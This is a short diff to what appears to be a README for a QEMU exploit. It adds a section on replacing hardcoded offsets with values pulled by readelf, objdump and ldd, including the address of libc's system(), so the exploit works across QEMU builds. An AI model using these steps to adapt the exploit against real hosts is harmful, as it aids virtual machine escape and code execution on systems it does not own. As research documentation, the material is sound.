@@ -33,6 +33,15 @@ The exploit can be weaponized to work reliably across many QEMU versions using t
 
 QEMU + Mutiny.
 
+## Offsets (USER FRIENDLY VERSION)
+
+- Replace `0x047E735` with `$(readelf -s qemu-system-x86_64  | grep cmd_logs_get_log | awk '{print $2}')`
+- Replace `0x0341BB0` with `$(objdump -S qemu-system-x86_64 | grep "<memmove@plt>:" | awk '{print $1}')`
+- Replace `0x01E72FF8` with `$(objdump -S qemu-system-x86_64 | grep "libc_start_main" | awk '{print $(NF-1)}')`
+- Find libc: `ldd ./qemu-system-x86_64 | grep libc.so`
+- Replace `0x2A200` with `readelf -sW /lib/x86_64-linux-gnu/libc.so.6 | grep -i __libc_start_main | awk '{print $2}'`
+- Replace `0x058750` with `readelf -sW /lib/x86_64-linux-gnu/libc.so.6 | grep -i system@ | awk '{print $2}'`
+
 ## Building
 
 ```
